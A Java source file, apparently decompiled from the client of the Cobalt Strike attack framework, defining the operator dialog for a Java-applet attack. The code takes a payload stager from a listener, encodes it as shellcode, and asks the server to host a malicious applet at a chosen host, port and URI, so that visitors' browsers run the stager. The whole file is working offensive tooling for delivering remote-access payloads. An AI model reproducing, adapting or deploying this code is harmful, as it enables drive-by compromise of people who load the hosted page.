package aggressor.dialogs;

import aggressor.AggressorClient;
import aggressor.DataUtils;
import common.Callback;
import common.CommonUtils;
import common.ListenerUtils;
import dialog.DialogListener;
import dialog.DialogManager;
import dialog.DialogUtils;
import encoders.Base64;

import java.awt.event.ActionEvent;
import java.io.IOException;
import java.util.Map;
import java.util.Stack;
import javax.swing.JButton;
import javax.swing.JFrame;

import sleep.runtime.SleepUtils;

public abstract class JavaAppletDialog implements DialogListener, Callback {

    protected JFrame dialog = null;

    protected AggressorClient client = null;

    protected String host;

    protected String port;

    protected String uri;

    protected String lname;

    protected String proto;

    protected boolean ssl;

    public JavaAppletDialog(AggressorClient aggressorClient) {
        this.client = aggressorClient;
    }

    public void dialogAction(ActionEvent actionEvent, Map map) {
        this.uri = DialogUtils.string(map, "uri");
        this.host = DialogUtils.string(map, "host");
        this.port = DialogUtils.string(map, "port");
        this.lname = DialogUtils.string(map, "listener");
        this.ssl = DialogUtils.bool(map, "ssl");
        this.proto = this.ssl ? "https://" : "http://";
        byte[] arrby1 = CommonUtils.readResource(getResourceName());
        byte[] arrby2 = ListenerUtils.getListener(this.client, this.lname).getPayloadStager("x86");
        String str = formatShellcode(arrby2);
        this.client.getConnection().call("cloudstrike.host_applet", CommonUtils.args(this.host, Integer.valueOf(Integer.parseInt(this.port)), Boolean.valueOf(this.ssl), this.uri, arrby1, str, getMainClass(), getShortDescription()), this);
    }

    public abstract String getResourceName();

    public abstract String getMainClass();

    public abstract String getShortDescription();

    public abstract String getTitle();

    public abstract String getURL();

    public abstract String getDescription();

    public abstract String getDefaultURL();

    public String formatShellcode(byte[] arrby) {
        Stack stack = new Stack();
        stack.push(SleepUtils.getScalar(arrby));
        String str = this.client.getScriptEngine().format("APPLET_SHELLCODE_FORMAT", stack);
        return (str != null) ? str : Base64.encode(arrby);
    }

    public void result(String string, Object object) {
        String str = object + "";
        if ("success".equals(str)) {
            DialogUtils.startedWebService("host applet", this.proto + this.host + ":" + this.port + this.uri);
        } else {
            DialogUtils.showError("Unable to start web server:\n" + str);
        }
    }

    public void show() throws IOException {
        this.dialog = DialogUtils.dialog(getTitle(), 640, 480);
        DialogManager dialogManager = new DialogManager(this.dialog);
        dialogManager.addDialogListener(this);
        dialogManager.set("uri", getDefaultURL());
        dialogManager.set("port", "80");
        dialogManager.set("host", DataUtils.getLocalIP(this.client.getData()));
        dialogManager.text("uri", "Local URI:", 20);
        dialogManager.text("host", "Local Host:", 20);
        dialogManager.text("port", "Local Port:", 20);
        dialogManager.sc_listener_stagers("listener", "Listener:", this.client);
        dialogManager.checkbox_add("ssl", "SSL:", "Enable SSL", DataUtils.hasValidSSL(this.client.getData()));
        JButton jButton1 = dialogManager.action("Launch");
        JButton jButton2 = dialogManager.help(getURL());
        this.dialog.add(DialogUtils.description(getDescription()), "North");
        this.dialog.add(dialogManager.layout(), "Center");
        this.dialog.add(DialogUtils.center(jButton1, jButton2), "South");
        this.dialog.pack();
        this.dialog.setVisible(true);
    }
}
